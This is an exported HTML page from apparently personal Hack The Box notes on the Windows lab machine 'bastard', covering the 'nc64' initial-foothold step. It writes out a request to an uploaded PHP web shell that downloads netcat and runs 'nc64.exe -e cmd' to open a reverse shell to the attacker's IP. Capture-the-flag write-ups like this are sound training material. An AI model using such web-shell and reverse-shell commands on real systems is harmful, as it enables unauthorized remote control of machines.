@@ -1,0 +1,33 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>nc64</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--bastard.html">bastard</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--nmap.html">nmap </a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--http--gobuster.html">gobuster</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold--cookie_manager.html">cookie manager</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold--drupal.php_RCE_exploit.html">drupal.php RCE exploit</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold--nc64.html">nc64</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--privesc--Sherlock.ps1.html">Sherlock.ps1</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--privesc--MS15-051.html">MS15-051</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>nc64</u></b></h1><span style="color:#24ff00;">find</span><span style="color:#ffa500;"> netcat 1.11</span><span style="color:#24ff00;"> windows executable </span><a href="https://eternallybored.org/misc/netcat/">here</a><br /><img src="images/52-1.png" alt="images/52-1.png" /><br /><br /><span style="color:#24ff00;">now that our </span><span style="color:#ffa500;">fexec</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">fupload</span><span style="color:#24ff00;"> php functions are uploaded and running </span><span style="color:#ffff00;">RCE</span><span style="color:#24ff00;"> for us, its time to use them both to download our netcat executable and run it to spawn a reverse shell back to our attack machine</span><br /><br /><span style="color:#ffa500;">10.10.10.9/steve.php?fupload=nc64.exe&amp;fexec=nc64.exe -e cmd 10.10.14.62  4444</span><br /><img src="images/52-2.png" alt="images/52-2.png" /><br /><br /><img src="images/52-3.png" alt="images/52-3.png" /><br /><img src="images/52-4.png" alt="images/52-4.png" /><br /><br /><br /><span style="color:#24ff00;">and we have our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;">!</span><br /><img src="images/52-5.png" alt="images/52-5.png" /><br /><img src="images/52-6.png" alt="images/52-6.png" /></div></div>
+</body></html>
